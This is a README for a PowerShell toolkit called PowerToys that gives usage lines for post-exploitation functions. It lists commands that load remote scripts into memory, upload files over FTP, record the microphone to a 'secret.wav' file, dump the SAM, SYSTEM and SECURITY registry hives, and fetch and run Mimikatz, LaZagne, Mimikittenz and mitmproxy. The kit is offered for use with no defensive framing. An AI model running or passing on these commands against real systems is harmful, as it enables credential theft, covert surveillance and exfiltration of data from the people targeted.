# PowerToys v1.0
PowerToys is a powershell collection of userfull functions like ftp upload, download functions, run in memory, unzip functions, etc. It is distributed under the GNU GPLv3 license. Before use a function, you must load the script in memory.
```
Download -url "https://example.com/file.txt" -outfile "c:\windows\temp\file.txt"
```
## List of tools
### Download
This function download a file from an URL.
```
Download -url "https://example.com/file.txt" -outfile "c:\windows\temp\file.txt"
```
### DownloadScript
This function download and load in memory a powershell script from an URL.
```
DownloadScript -url "http://example.com/a.ps1" 
```
### Unzip
This function allows unzip a file in speficif folder.
```
Unzip -zipfile "myzip.zip" -path "c:\windows\temp"
```
### UploadFtp
This function allows upload a file to FTP server.
```
UploadFtp -address "192.168.0.1" -username "username" -password "password" -pathFileName "/folder/file.txt" -uploadfile "file.txt"
```
### RunVoiceRecord
This functions allows record from mic.
```
RunVoiceRecord -fullPathOutput "C:\windows\temp\secret.wav" -seconds 120
```
### DumpHives
This functio dump sam, system and security from register hives.
```
DumpHives -dumpfolder "C:/windows/temp"
```
### RunMitmp
This function download, and run mitmproxy, in the 8080 port.
```
RunMitmp
```
### RunLazagne
This function download, unzip, and run Lazagne.
```
RunLazagne
```
### RunMimikatz
This function download and run mimikatz from Powersploit.
```
RunMimikatz
```
### RunMimikittenz
This function download and run mimikittenz.
```
RunMimikittenz
```
